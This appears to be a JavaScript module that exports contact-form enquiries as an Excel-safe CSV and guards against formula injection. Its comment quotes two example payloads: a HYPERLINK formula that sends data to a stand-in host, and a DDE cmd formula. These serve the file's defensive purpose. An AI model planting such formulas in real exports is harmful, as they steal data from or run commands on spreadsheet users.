/* The enquiry export, as a CSV Excel opens without mangling it.

   Lifted out of Enquiries.jsx so the escaping below can carry a test. It is
   the one piece of this console that takes text a stranger typed on the
   public contact form and hands it to a program that executes things. */

/* Two separate jobs, and only the first is about formatting.

   Quoting: Excel splits on the system locale's separator, so an unquoted
   comma inside a message would shift every column after it. A phone number
   like 9822041155 survives as a number, but a leading zero would not, and
   quoting keeps it text.

   The apostrophe: a cell beginning =, +, - or @ is a FORMULA to Excel,
   LibreOffice and Sheets, and `message` comes straight off the public form
   with 2,000 characters an attacker chooses. `=HYPERLINK("https://evil.tld?d="
   &A1&B1,"Open")` exfiltrates a lead's phone number on one click; the older
   `=cmd|'/c calc'!A1` form is worse. Quoting alone does not stop it -- Excel
   strips the quotes and then evaluates what is inside. A leading apostrophe
   does: it forces the cell to text, and it is not shown in the cell.

   Tab and carriage return are here because both let a value slide into the
   next cell, where a leading = would no longer be leading. */
const cell = (v) => {
  const s = String(v ?? "");
  return `"${(/^[=+\-@\t\r]/.test(s) ? `'${s}` : s).replace(/"/g, '""')}"`;
};

const HEAD = ["Received", "Name", "Phone", "Project", "Source", "Status", "Message"];

export function toCSV(rows, names = {}) {
  const body = rows.map((r) =>
    [new Date(r.created_at).toLocaleString("en-IN"), r.name, r.phone,
     names[r.project] || r.project || "", r.source || "contact", r.status, r.message].map(cell).join(",")
  );
  return [HEAD.map(cell).join(","), ...body].join("\r\n");
}
